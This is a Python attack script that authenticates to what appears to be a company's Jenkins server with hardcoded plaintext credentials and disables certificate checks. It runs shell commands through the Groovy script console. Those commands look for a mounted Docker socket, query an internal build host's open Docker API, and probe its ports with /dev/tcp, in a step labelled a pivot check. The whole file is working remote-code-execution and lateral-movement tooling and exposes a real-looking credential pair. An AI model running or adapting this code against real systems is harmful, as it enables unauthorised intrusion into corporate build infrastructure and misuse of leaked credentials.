import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


TASK_S = r'''def r = ["bash","-c","""
echo '===== docker.sock mounted? ====='
ls -la /var/run/docker.sock 2>/dev/null || echo 'no docker.sock'
echo '===== container caps / privileged hints ====='
cat /proc/1/cgroup 2>/dev/null | head -3
hostname
echo '===== Docker API to build host CSDEVBLD01-1 (172.27.140.148:4243) ====='
curl -sk --max-time 6 'http://172.27.140.148:4243/version' 2>&1 | head -c 400
echo ''
echo '===== Docker API containers on build host ====='
curl -sk --max-time 6 'http://172.27.140.148:4243/containers/json?all=0' 2>&1 | head -c 1500
echo ''
echo '===== reachability: build host from container ====='
timeout 3 bash -c 'echo > /dev/tcp/172.27.140.148/4243' 2>/dev/null && echo '4243 OPEN' || echo '4243 closed'
timeout 3 bash -c 'echo > /dev/tcp/172.27.140.148/22' 2>/dev/null && echo '22 OPEN' || echo '22 closed'
"""].execute().text
println r
'''

TASKS = [("TASK S: docker.sock + build host Docker API (pivot check)", TASK_S)]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
